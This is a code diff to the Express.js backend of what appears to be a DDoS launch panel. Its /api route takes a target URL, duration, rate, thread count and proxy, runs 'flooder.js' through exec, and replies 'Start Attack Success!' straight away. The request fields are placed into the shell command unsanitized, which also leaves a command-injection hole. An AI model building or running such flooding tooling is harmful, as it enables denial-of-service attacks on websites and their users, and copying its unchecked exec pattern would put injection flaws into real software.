@@ -36,37 +36,28 @@ app.get(`/api`, async (req, res) => {
     // Chuẩn bị lệnh gọi tệp flooder.js
     const command = `node flooder.js ${field.url} ${field.time} ${field.rate} ${field.thea} ${field.proxy}`;
 
-    try {
-        const startTime = process.hrtime();
+    // Gửi phản hồi trạng thái ban đầu ngay lập tức
+    res.json({
+        status: 200,
+        message: 'Start Attack Success!',
+        data: {
+            url: field.url,
+            time: field.time,
+            rate: field.rate,
+            thea: field.thea,
+            proxy: field.proxy,
+        }
+    });
 
-        exec(command, (error, stdout, stderr) => {
-            if (error) {
-                console.error(`Lỗi: ${stderr}`);
-                return res.json({ status: 500, data: `Gửi yêu cầu không thành công` });
-            }
+    // Thực thi lệnh sau khi gửi phản hồi
+    exec(command, (error, stdout, stderr) => {
+        if (error) {
+            console.error(`Lỗi: ${stderr}`);
+            return;
+        }
 
-            const elapsedTime = process.hrtime(startTime);
-            const elapsedTimeMs = elapsedTime[0] * 1000 + elapsedTime[1] / 1000000;
-
-            console.log(`Gửi yêu cầu thành công: ${stdout}`);
-
-            return res.json({
-                status: 200,
-                message: 'Gửi yêu cầu thành công',
-                elapsed_time: elapsedTimeMs.toFixed(2),
-                data: {
-                    url: field.url,
-                    time: field.time,
-                    rate: field.rate,
-                    thea: field.thea,
-                    proxy: field.proxy,
-                }
-            });
-        });
-    } catch (e) {
-        console.error(`Lỗi khi xử lý: ${e.message}`);
-        return res.json({ status: 500, data: `Gửi yêu cầu không thành công` });
-    }
+        console.log(`Gửi yêu cầu thành công: ${stdout}`);
+    });
 });
 
 // Thêm route tải proxy tự động
